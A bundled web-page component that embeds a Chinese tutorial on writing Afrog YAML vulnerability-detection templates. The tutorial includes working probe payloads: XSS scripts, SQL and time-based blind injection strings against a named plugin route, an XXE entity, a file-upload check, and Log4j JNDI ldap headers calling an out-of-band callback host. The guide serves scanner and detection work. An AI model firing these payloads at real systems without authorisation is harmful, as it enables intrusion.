import{p as w,Q as l,o as g,R as T,f as v,S,c as E,d as q,e as _,j as d,U as C,K as u,L as c,V as P}from"../chunks/D4cyIAOc.js";const L=`# Afrog POC 规则编写权威指南

<div style="display: flex; gap: 24px; align-items: flex-start;">
<!-- 左侧导航 -->
<nav style="min-width: 260px; max-width: 260px;  padding: 16px; position: sticky; top: 40px;">
  <h2 style="margin-top: 0;">📚 目录导航</h2>
  <ul style="list-style: none; padding-left: 0; line-height: 1.6;">
    <li style="padding: 10px 0 20px 0;"><a href="#前言"><strong>前言</strong></a></li>
    <li><strong>🔧 基础语法</strong>
      <ul>
        <li><a href="#poc-基础结构">POC 基础结构</a></li>
        <li><a href="#info-信息定义">Info 信息定义</a></li>
        <li><a href="#set-变量定义">Set 变量定义</a></li>
        <li><a href="#rules-规则与-request">Rules 规则与 Request</a></li>
        <li><a href="#expression-表达式">Expression 表达式</a></li>
        <li><a href="#extractors-数据提取器">Extractors 数据提取器</a></li>
      </ul>
    </li>
    <li><strong>⚡ 中级技巧</strong>
      <ul>
        <li><a href="#条件判断与组合">条件判断与组合</a></li>
        <li><a href="#变量作用域与引用">变量作用域与引用</a></li>
        <li><a href="#内置函数与使用限制">内置函数与使用限制</a></li>
        <li><a href="#请求与响应变量">请求与响应变量</a></li>
      </ul>
    </li>
    <li><strong>🚀 高级应用</strong>
      <ul>
        <li><a href="#多步骤规则组合">多步骤规则组合</a></li>
        <li><a href="#oob-盲注与外带检测">OOB 盲注与外带检测</a></li>
        <li><a href="#原始请求-raw-http">原始请求 Raw HTTP</a></li>
        <li><a href="#tcp-协议检测">TCP 协议检测</a></li>
      </ul>
    </li>
    <li><strong>💡 实战案例</strong>
      <ul>
        <li><a href="#xss-反射型与存储型">XSS 反射型与存储型</a></li>
        <li><a href="#sql-注入与时间盲注">SQL 注入与时间盲注</a></li>
        <li><a href="#文件上传与验证">文件上传与验证</a></li>
        <li><a href="#log4j-jndi-检测">Log4j JNDI 检测</a></li>
      </ul>
    </li>
    <li><strong>📖 附录</strong>
      <ul>
        <li><a href="#语法参考与字段清单">语法参考与字段清单</a></li>
        <li><a href="#内置函数清单">内置函数清单</a></li>
        <li><a href="#常见问题与最佳实践">常见问题与最佳实践</a></li>
      </ul>
    </li>
  </ul>
</nav>

<!-- 右侧内容 -->
<div style="flex: 1; min-width: 0;">

## 前言
Afrog 是一个基于 YAML 的漏洞检测框架，使用 POC（Proof of Concept）规则定义各类检测逻辑。本文档基于 Afrog 源码与官方 PoC 模板完整分析，覆盖从基础到高级的编写方法，所有示例均可直接复制使用，并严格遵循 Afrog 的语法与函数约束。

---

## 🔧 基础语法

### POC 基础结构
每个 POC 文件由顶级键组成：
- 顶级键：\`id\`、\`info\`、\`set\`、\`rules\`、\`expression\`
- 位置与缩进必须符合 YAML 规范（空格缩进，推荐 2 空格）

简单示例（结构演示）：
\`\`\`yaml
id: demo-basic

info:
  name: 基础结构示例
  author: your-name
  severity: info

set:
  token: "abc123"

rules:
  r0:
    request:
      method: GET
      path: /status
    expression: response.status == 200

expression: r0()
\`\`\`

实际应用示例（含头部与体）：
\`\`\`yaml
id: demo-basic-headers-body

info:
  name: 基础结构（头体）
  author: your-name
  severity: low

set:
  ua: "Afrog/3.0"

rules:
  r0:
    request:
      method: POST
      path: /api/login
      headers:
        User-Agent: "{{ua}}"
        Content-Type: application/json
      body: '{"username":"admin","password":"admin"}'
    expression: response.status == 200 && response.body.bcontains(b"token")

expression: r0()
\`\`\`

复杂组合示例（多规则 + 顶层表达式）：
\`\`\`yaml
id: demo-basic-multi

info:
  name: 多规则基础结构
  author: your-name
  severity: medium

rules:
  ping:
    request:
      method: GET
      path: /ping
    expression: response.status == 200 && response.body.bcontains(b"pong")

  version:
    request:
      method: GET
      path: /version
    expression: response.status == 200 && "[0-9]+\\\\.[0-9]+".bmatches(response.body)

expression: ping() && version()
\`\`\`

### Info 信息定义
字段与语义必须严格遵循 Afrog：
- 必填：\`name\`, \`author\`, \`severity\`
- 可选：\`description\`, \`tags\`, \`created\`, \`reference\`, \`verified\`
- 严重级别：\`critical | high | medium | low | info\`

简单示例：
\`\`\`yaml
info:
  name: 站点可达性检查
  author: your-name
  severity: info
\`\`\`

实际应用示例（描述、参考、标签）：
\`\`\`yaml
info:
  name: Apache Struts2 RCE 检测
  author: your-name
  severity: critical
  description: 检测目标是否存在 Struts2 远程代码执行漏洞
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
  tags: struts,rce,apache
  created: 2024/01/01
\`\`\`

复杂组合示例（验证标记、受影响版本说明）：
\`\`\`yaml
info:
  name: WebLogic 反序列化检测
  author: your-name
  severity: high
  verified: true
  description: 检测 WebLogic WLS Security 组件反序列化漏洞
  reference:
    - https://www.oracle.com/security-alerts/
  tags: weblogic,deserialization,rce
  created: 2024/04/10
\`\`\`

### Set 变量定义
\`set\` 用于定义可在 POC 中引用的变量。内置函数只能在 \`set\` 和 \`expression\` 中使用。

简单示例：
\`\`\`yaml
set:
  username: admin
  password: admin
\`\`\`

实际应用示例（动态随机与编码）：
\`\`\`yaml
set:
  rboundary: randomLowercase(8)
  xss_payload: "<script>alert(1)<\/script>"
  xss_payload_encoded: urlencode(xss_payload)
\`\`\`

复杂组合示例（组合多个工具函数）：
\`\`\`yaml
set:
  randfile: randomLowercase(10)
  raw_token: "admin:password"
  token_b64: base64(raw_token)
  today: shortyear(0) + "-" + month(0) + "-" + day(0)
\`\`\`

### Rules 规则与 Request
HTTP 请求字段：
- \`method\`：GET/POST/PUT/DELETE/HEAD/OPTIONS/PATCH
- \`path\`：请求路径（支持模板变量 \`{{var}}\`）
- \`headers\`：键值对
- \`body\`：字符串或多行文本（\`|\`）
- \`follow_redirects\`：是否跟随 3xx（可选）

简单示例（GET）：
\`\`\`yaml
rules:
  r0:
    request:
      method: GET
      path: /health
    expression: response.status == 200
\`\`\`

实际应用示例（POST JSON 与头部）：
\`\`\`yaml
rules:
  login:
    request:
      method: POST
      path: /api/login
      headers:
        Content-Type: application/json
      body: '{"user":"{{username}}","pass":"{{password}}"}'
    expression: response.status == 200 && response.body.bcontains(b"token")
\`\`\`

复杂组合示例（Raw HTTP 原始请求，详见后文 Raw 章节）：
\`\`\`yaml
rules:
  raw_req:
    request:
      raw: |
        GET /api/users HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
    expression: response.status == 200 && response.body.bcontains(b"users")
\`\`\`

### Expression 表达式
Afrog 使用 CEL（Common Expression Language）表达式。
常用对象与函数：
- \`response.status\`, \`response.body\`, \`response.headers\`, \`response.content_type\`, \`response.raw_header\`, \`response.latency\`
- 字符串与字节匹配：\`contains\`/\`icontains\`/\`matches\`/\`bmatches\`/\`bcontains\`/\`ibcontains\` 等

简单示例：
\`\`\`yaml
expression: response.status == 200
\`\`\`

实际应用示例（大小写不敏感包含与延迟判断）：
\`\`\`yaml
expression: response.status == 200 && response.body.ibcontains(b"success") && response.latency < 3000
\`\`\`

复杂组合示例（正则与多条件）：
\`\`\`yaml
expression: |
  response.status == 200 &&
  "((u|g)id|groups)=[0-9]{1,4}\\\\([a-z0-9]+\\\\)".bmatches(response.body) &&
  !response.body.ibcontains(b"error")
\`\`\`

### Extractors 数据提取器
用于从响应中提取变量，供后续规则使用。

Output 方式：（推荐）

简单示例（正则提取单值）：
\`\`\`yaml
rules:
  r0:
    request:
      method: GET
      path: /profile
    expression: response.status == 200
    output:
      web_title: '"<title>(?P<webtitle>.+)</title>".bsubmatch(response.body)'
  r1:
    request:
      method: GET
      path: /title={{web_title['webtitle']}}
    expression: response.status == 200
expression: r0() && r1()
\`\`\`

实际应用示例（多值提取与引用）：
\`\`\`yaml
rules:
  get_config:
    request:
      method: GET
      path: /api/config
    expression: response.status == 200
    output:
      web_title: '"<title>(?P<webtitle>.+)</title>".bsubmatch(response.body)'
      web_cookie: '"Set-Cookie: (?P<webcookie>.+)".bsubmatch(response.raw_header)'

  use_key:
    request:
      method: GET
      path: /api/admin?title={{web_title['webtitle']}}
      headers:
        Cookie: "{{web_cookie['webcookie']}}"
    expression: response.status == 200 && response.body.icontains("admin")
\`\`\`

Extractors 方式：

简单示例（正则提取单值）：
\`\`\`yaml
rules:
  r0:
    request:
      method: GET
      path: /profile
    expression: response.status == 200
    extractors:
      - type: regex
        extractor:
          web_title: '"<title>(?P<webtitle>.+)</title>".bsubmatch(response.body)'
  r1:
    request:
      method: GET
      path: /title={{web_title['webtitle']}}
    expression: response.status == 200
expression: r0() && r1()
\`\`\`

实际应用示例（多值提取与引用）：
\`\`\`yaml
rules:
  get_config:
    request:
      method: GET
      path: /api/config
    expression: response.status == 200
    extractors:
      - type: regex
        extractor:
          web_title: '"<title>(?P<webtitle>.+)</title>".bsubmatch(response.body)'
          web_cookie: '"Set-Cookie: (?P<webcookie>.+)".bsubmatch(response.raw_header)'

  use_key:
    request:
      method: GET
      path: /api/admin?title={{web_title['webtitle']}}
      headers:
        Cookie: "{{web_cookie['webcookie']}}"
    expression: response.status == 200 && response.body.icontains("admin")
\`\`\`

---

## ⚡ 中级技巧

### 条件判断与组合
- 逻辑：\`&&\`, \`||\`, \`!\`
- 比较：\`==\`, \`!=\`, \`>\`, \`<\`, \`>=\`, \`<=\`

简单示例：
\`\`\`yaml
expression: response.status == 200 || response.status == 302
\`\`\`

实际应用示例（组合判断）：
\`\`\`yaml
expression: response.status == 200 && response.body.bcontains(b"dashboard")
\`\`\`

复杂组合示例（嵌套与正则）：
\`\`\`yaml
expression: (response.status == 200 && response.body.bcontains(b"SUCCESS")) || (response.status >= 500 && response.body.ibcontains(b"exception"))
\`\`\`

### 变量作用域与引用
- \`set\` 定义的变量在整个 POC 中可引用：\`{{var}}\`
- 从 \`extractors\`、\`output\` 提取的变量同样可在后续规则中引用

### 内置函数与使用限制
依据源码与官方约定：
- 常用函数：\`randomLowercase\`, \`randomInt\`, \`base64\`, \`base64Decode\`, \`urlencode\`, \`urldecode\`, \`md5\`, \`hexdecode\`, \`toUpper\`, \`toLower\`, \`substr\`, \`replaceAll\`, \`printable\`, \`faviconHash\`, \`versionCompare\`, \`ysoserial\`, \`aesCBC\`, \`repeat\`, \`decimal\`, \`length\`, \`timestamp_second\`, \`year\`, \`shortyear\`, \`month\`, \`day\`, \`oobCheck\`, \`wait\`, \`jndi\`, \`sleep\`

示例：
\`\`\`yaml
set:
  q_raw: "<script>alert(1)<\/script>"
  q: urlencode(q_raw)

rules:
  r0:
    request:
      method: GET
      path: /search?q={{q}}
    expression: response.status == 200 && response.body.bcontains(b"search")
\`\`\`

### 请求与响应变量
- 请求变量（只读）：\`request.url\`, \`request.url.host\`, \`request.url.path\`, \`request.url.query\`
- 响应变量：\`response.status\`, \`response.body\`, \`response.headers\`, \`response.content_type\`, \`response.raw_header\`, \`response.latency\`, \`response.raw\`（字节流）

---

## 🚀 高级应用

### 多步骤规则组合
注意：
- 每个规则的 \`expression\` 必须独立判断，不能依赖前一个规则的结果。
- 最后一个规则的 \`expression\` 通常用于判断最终结果。
- \`POST\` 请求中，如果不指定 \`Content-Type \`的话，默认自动添加 \`Content-Type: application/x-www-form-urlencoded\` 头部。


简单示例（两步组合）：
\`\`\`yaml
id: steps-demo
info:
  name: 两步组合
  author: your-name
  severity: medium

rules:
  step1:
    request:
      method: GET
      path: /login
    expression: response.status == 200 && response.body.icontains("csrf_token")

  step2:
    request:
      method: POST
      path: /login
      body: "username=admin&password=admin"
    expression: response.status == 302

expression: step1() && step2()
\`\`\`

### OOB 盲注与外带检测
Afrog 支持 OOB（Out-of-Band）交互检测，常用于 DNS/HTTP 外带验证。

实际应用示例（DNS OOB）：
\`\`\`yaml
id: blind-xxe-oob
info:
  name: 盲 XXE OOB 检测
  author: your-name
  severity: high

set:
  oob: oob()
  oobDNS: oob.DNS

rules:
  r0:
    request:
      method: POST
      path: /xml-endpoint
      headers:
        Content-Type: application/xml
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY % remote SYSTEM "http://{{oobDNS}}">
          %remote;
        ]>
        <root>test</root>
    expression: oobCheck(oob, oob.ProtocolDNS, 3)

expression: r0()
\`\`\`

复杂组合示例（JNDI 注入头）：
\`\`\`yaml
id: jndi-header-oob
info:
  name: JNDI 注入 OOB 检测
  author: your-name
  severity: critical

set:
  oob: oob()
  oobDNS: oob.DNS

rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        X-Forwarded-For: "\${jndi:ldap://{{oobDNS}}}"
    expression: oobCheck(oob, oob.ProtocolDNS, 3)

expression: r0()
\`\`\`

### 原始请求 Raw HTTP
适用于复杂 HTTP 报文（如多段、升级、特别头部顺序等）。
\`\`\`yaml
rules:
  raw_req:
    request:
      type: http
      raw: |
        GET /ws HTTP/1.1
        Host: {{Hostname}}
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Version: 13
    expression: response.status == 101 && response.raw_header.ibcontains(b"upgrade")
\`\`\`

### TCP 协议检测
用于识别网络服务特征（如数据库）。
\`\`\`yaml
id: tcp-detect
info:
  name: TCP 服务识别
  author: your-name
  severity: info

rules:
  mysql:
    request:
      type: tcp
      host: "{{Hostname}}"
      port: 3306
      data: "\\n"
    expression: response.raw.ibcontains(b"mysql") || response.raw.ibcontains(b"mariadb")

expression: mysql()
\`\`\`

---

## 💡 实战案例

### XSS 反射型与存储型
简单示例（反射型）：
\`\`\`yaml
id: xss-reflect
info:
  name: 反射型 XSS 检测
  author: your-name
  severity: medium

set:
  payload_raw: "<script>alert(1)<\/script>"
  payload: urlencode(payload_raw)

rules:
  r0:
    request:
      method: GET
      path: /search?q={{payload}}
    expression: response.status == 200 && response.body.bcontains(bytes(payload_raw))

expression: r0()
\`\`\`

实际应用示例（存储型）：
\`\`\`yaml
id: xss-stored
info:
  name: 存储型 XSS 检测
  author: your-name
  severity: medium

set:
  c_raw: "<img src=x onerror=alert(1)>"
  c: urlencode(c_raw)

rules:
  submit:
    request:
      method: POST
      path: /comment
      body: "name=test&comment={{c}}"
    expression: response.status == 200

  verify:
    request:
      method: GET
      path: /comments
    expression: response.status == 200 && response.body.bcontains(bytes(c_raw))

expression: submit() && verify()
\`\`\`

### SQL 注入与时间盲注
简单示例（数字型）：
\`\`\`yaml
id: sqli-num
info:
  name: 数字型 SQL 注入
  author: your-name
  severity: high

set:
  rid: randomInt(10000, 99999)

rules:
  r0:
    request:
      method: GET
      path: /product?id={{rid}} AND 1=1
    expression: response.status == 200 && response.body.ibcontains(b"product")

expression: r0()
\`\`\`

实际应用示例（字符型）：
\`\`\`yaml
id: sqli-str
info:
  name: 字符型 SQL 注入
  author: your-name
  severity: high

rules:
  r0:
    request:
      method: GET
      path: /search?q=test' AND '1'='1
    expression: response.status == 200 && response.body.ibcontains(b"search results")

expression: r0()
\`\`\`

复杂组合示例（时间盲注）：
\`\`\`yaml
id: sqli-time
info:
  name: 时间盲注
  author: your-name
  severity: high

rules:
  r0:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 12000 &&  
      response.latency >= 10000
  r1:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 8000 &&  
      response.latency >= 6000
  r2:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 12000 &&  
      response.latency >= 10000
  r3:
    request:
      method: GET
      path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'created_at') &&
      response.body.bcontains(b'video_id') &&
      response.latency <= 8000 &&  
      response.latency >= 6000

expression: r0() && r1() && r2() && r3()
\`\`\`

### 文件上传与验证
实际应用示例（multipart 上传 + 路径访问验证）：
\`\`\`yaml
id: upload-verify
info:
  name: 文件上传与验证
  author: your-name
  severity: high

set:
  rfilename: randomLowercase(20)
  rbody: randomLowercase(32)
  rboundary: randomLowercase(8)
rules:
  upload:
    request:
      method: POST
      path: /tplus/SM/SetupAccount/Upload.aspx?preload=1
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: |
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="File1";filename="{{rfilename}}.html"
        Content-Type: image/jpeg

        {{rbody}}
        ------WebKitFormBoundary{{rboundary}}--
    expression: response.status == 200
  verify:
    request:
      method: GET
      path: /tplus/SM/SetupAccount/images/{{rfilename}}.html
    expression: response.status == 200 && response.body.bcontains(bytes(rbody))
expression: upload() && verify()
\`\`\`

### Log4j JNDI 检测
实际应用示例（参考官方模板）：
\`\`\`yaml
id: log4j-jndi-check
info:
  name: Log4j JNDI 检测
  author: your-name
  severity: critical

set:
  oob: oob()
  oobDNS: oob.DNS

rules:
  r0:
    request:
      method: GET
      path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
      headers:
        X-Forwarded-For: "\${jndi:ldap://{{oobDNS}}}"
    expression: oobCheck(oob, oob.ProtocolDNS, 3)

expression: r0()
\`\`\`

---

## 📖 附录

### 语法参考与字段清单
- 顶级键：\`id\`, \`info\`, \`set\`, \`rules\`, \`expression\`
- \`info\` 字段：\`name\`, \`author\`, \`severity\`, \`description\`, \`tags\`, \`created\`, \`reference\`, \`verified\`
- HTTP 请求：\`method\`, \`path\`, \`headers\`, \`body\`, \`follow_redirects\`
- Raw HTTP：\`raw\`
- TCP 请求：\`type: tcp\`, \`host\`, \`port\`, \`data\`
- 变量引用：\`{{var}}\`
- 请求变量：\`request.url\`, \`request.url.host\`, \`request.url.path\`, \`request.url.query\`
- 响应变量：\`response.status\`, \`response.body\`, \`response.headers\`, \`response.content_type\`, \`response.raw_header\`, \`response.latency\`, \`response.raw\`

### 内置函数清单
- 编码与转换：\`base64\`, \`base64Decode\`, \`urlencode\`, \`urldecode\`, \`md5\`, \`hexdecode\`, \`toUpper\`, \`toLower\`, \`substr\`, \`replaceAll\`, \`printable\`, \`faviconHash\`, \`decimal\`, \`length\`
- 随机与时间：\`randomLowercase\`, \`randomInt\`, \`timestamp_second\`, \`year\`, \`shortyear\`, \`month\`, \`day\`, \`sleep\`, \`wait\`, \`repeat\`
- 安全与协议：\`versionCompare\`, \`ysoserial\`, \`aesCBC\`, \`jndi\`, \`oobCheck\`


### 常见问题与最佳实践
- 表达式错误：
  - 使用 \`==\` 而非 \`=\`
  - 合理使用逻辑运算符（\`&&\`、\`||\`、\`!\`）
- 空值防护：
  \`\`\`yaml
  expression: response.headers["server"] != "" && response.headers["server"].icontains("server")
  \`\`\`
- OOB 交互：
  - \`oob()\`, \`oob.DNS\`, \`oob.HTTP\`, \`oobCheck(oob, protocol, timeout)\` 的组合
- 正则转义：
  - 在 YAML 字符串中需双反斜杠 \`\\\\\` 表示单个反斜杠
- 与官方一致的术语：
  - 严重性：\`critical|high|medium|low|info\`
  - 字节判断：\`bcontains|ibcontains|bmatches\` 等

---

## 结语
通过上述从基础到高级的系统讲解，你可以快速编写可执行、稳定且低误报的 Afrog POC。建议在开发时参考本指南与现有 \`pocs/afrog-pocs/\` 模板，保持语法与函数使用的一致性。Happy Hunting! 🎯

</div>
</div>`;var O=v('<div class="flex flex-1 flex-col"><div class="markdown max-w-none"><!></div></div>');function D(m,h){w(h,!1);function b(n){return n.toLowerCase().trim().replace(/\s+/g,"-").replace(/[^a-z0-9\u4e00-\u9fa5\-]/g,"")}l.use({renderer:{heading(n){const e=n?.text??"",s=n?.depth??1,o=b(e);return`<h${s} id="${o}" aria-level="${s}">${e}</h${s}>`}}});const y=l.parse(L);let r=C();g(()=>{const n=d(r);n&&n.addEventListener("click",e=>{const o=e.target.closest('a[href^="#"]');if(!o)return;e.preventDefault();const x=o.getAttribute("href")||"",i=decodeURIComponent(x.slice(1)),p=n.querySelector(`#${CSS.escape(i)}`);p&&(p.scrollIntoView({behavior:"smooth",block:"start"}),history.replaceState(null,"",`#${i}`))})}),T();var t=O(),a=u(t),f=u(a);S(f,()=>y),c(a),E(a,n=>P(r,n),()=>d(r)),c(t),q(m,t),_()}export{D as component};
